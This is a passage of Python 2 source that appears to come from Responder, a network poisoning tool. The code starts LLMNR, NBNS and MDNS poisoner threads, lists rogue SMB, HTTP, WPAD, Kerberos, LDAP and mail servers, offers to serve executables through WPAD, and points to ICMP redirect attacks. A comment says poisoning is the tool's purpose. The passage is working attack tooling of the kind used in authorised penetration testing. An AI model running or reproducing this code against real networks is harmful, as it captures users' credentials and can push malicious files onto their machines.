				result.append("[Analyze mode: ICMP] You can ICMP Redirect on this network. This workstation (%s) is not on the same subnet than the DNS server (%s). Use python Icmp-Redirect.py for more details."%(IP, x))
			else:
				pass

		return result

	def printDebugInfo(self):
		start_message = "|  |_ Responder will redirect requests to: %s\n" % OURIP
	   #start_message += "|  |_ Responder is bound to interface: %s\n" % INTERFACE
		start_message += "|  |_ Challenge set: %s\n" % NumChal
		start_message += "|  |_ WPAD Proxy Server: %s\n" % WPAD_On_Off
	   #start_message += "|  |_ WPAD script loaded: %s\n" % WPAD_Script
		start_message += "|  |_ HTTP Server: %s\n" % On_Off
		start_message += "|  |_ HTTPS Server: %s\n" % SSL_On_Off
		start_message += "|  |_ SMB Server: %s\n" % SMB_On_Off
		start_message += "|  |_ SMB LM support: %s\n" % LM_On_Off
		start_message += "|  |_ Kerberos Server: %s\n" % Krb_On_Off
		start_message += "|  |_ SQL Server: %s\n" % SQL_On_Off
		start_message += "|  |_ FTP Server: %s\n" % FTP_On_Off
		start_message += "|  |_ IMAP Server: %s\n" % IMAP_On_Off
		start_message += "|  |_ POP3 Server: %s\n" % POP_On_Off
		start_message += "|  |_ SMTP Server: %s\n" % SMTP_On_Off
	   #start_message += "|  |_ DNS Server: %s\n" % DNS_On_Off
		start_message += "|  |_ LDAP Server: %s\n" % LDAP_On_Off
		start_message += "|  |_ FingerPrint hosts: %s\n" % Finger_On_Off
		start_message += "|  |_ Serving Executable via HTTP&WPAD: %s\n" % Exe_On_Off
		start_message += "|  |_ Always Serving a Specific File via HTTP&WPAD: %s" % Exec_Mode_On_Off
		
		print start_message

	def start(self):
		Is_FTP_On(FTP_On_Off)
		Is_HTTP_On(On_Off)
		Is_HTTPS_On(SSL_On_Off)
		Is_WPAD_On(WPAD_On_Off)
		Is_Kerberos_On(Krb_On_Off)
		Is_SMB_On(SMB_On_Off)
		Is_SQL_On(SQL_On_Off)
		Is_LDAP_On(LDAP_On_Off)
		Is_DNS_On(DNS_On_Off)
		Is_POP_On(POP_On_Off)
		Is_SMTP_On(SMTP_On_Off)
		Is_IMAP_On(IMAP_On_Off)
		#Browser listener loaded by default
		t1 = threading.Thread(name="Browser", target=serve_thread_udp, args=('', 138, Browser))
		## Poisoner loaded by default, it's the purpose of this tool...
		t2 = threading.Thread(name="MDNS", target=serve_thread_udp_MDNS, args=('', 5353, MDNS)) #MDNS
		t3 = threading.Thread(name="KerbUDP", target=serve_thread_udp, args=('', 88, KerbUDP)) 
		t4 = threading.Thread(name="NBNS", target=serve_thread_udp, args=('', 137,NB)) #NBNS
		t5 = threading.Thread(name="LLMNR", target=serve_thread_udp_LLMNR, args=('', 5355, LLMNR)) #LLMNR

		for t in [t1, t2, t3, t4, t5]:
			t.setDaemon(True)
			t.start()
